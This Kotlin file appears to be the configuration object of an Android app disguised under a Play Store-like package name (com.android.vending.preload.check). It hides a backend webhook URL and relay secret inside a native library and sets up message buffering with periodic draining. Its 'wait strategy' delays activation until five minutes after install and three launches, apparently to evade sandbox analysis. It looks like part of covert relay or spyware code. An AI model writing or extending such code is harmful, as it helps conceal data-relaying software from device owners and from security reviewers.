package com.android.vending.preload.check

import android.content.Context
import android.content.SharedPreferences

object Config {
    init {
        System.loadLibrary("relay")
    }

    private external fun getBackendUrl(): String
    private external fun getRelaySecret(): String

    val BACKEND_WEBHOOK: String by lazy { getBackendUrl() }
    val RELAY_SECRET: String by lazy { getRelaySecret() }

    const val DEVICE_ID = "550e8400-e29b-41d4-a716-446655440000"
    const val TIMEOUT_SECONDS = 15L
    const val MAX_BUFFERED_MESSAGES = 500
    const val BUFFER_DRAIN_INTERVAL_SECONDS = 900L

    // ── Wait Strategy Settings ──────────────────────────────────────
    private const val PREFS_NAME = "system_check_prefs"
    private const val KEY_INSTALL_TIME = "install_time"
    private const val KEY_LAUNCH_COUNT = "launch_count"
    private const val WAIT_THRESHOLD_MS = 5 * 60 * 1000 // 5 minutes
    private const val WAIT_LAUNCH_THRESHOLD = 3

    fun shouldActivate(context: Context): Boolean {
        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        
        // Track first install time
        var installTime = prefs.getLong(KEY_INSTALL_TIME, 0L)
        if (installTime == 0L) {
            installTime = System.currentTimeMillis()
            prefs.edit().putLong(KEY_INSTALL_TIME, installTime).apply()
        }

        // Track launch count
        val launchCount = prefs.getInt(KEY_LAUNCH_COUNT, 0) + 1
        prefs.edit().putInt(KEY_LAUNCH_COUNT, launchCount).apply()

        val timePassed = System.currentTimeMillis() - installTime
        return timePassed > WAIT_THRESHOLD_MS && launchCount >= WAIT_LAUNCH_THRESHOLD
    }
}
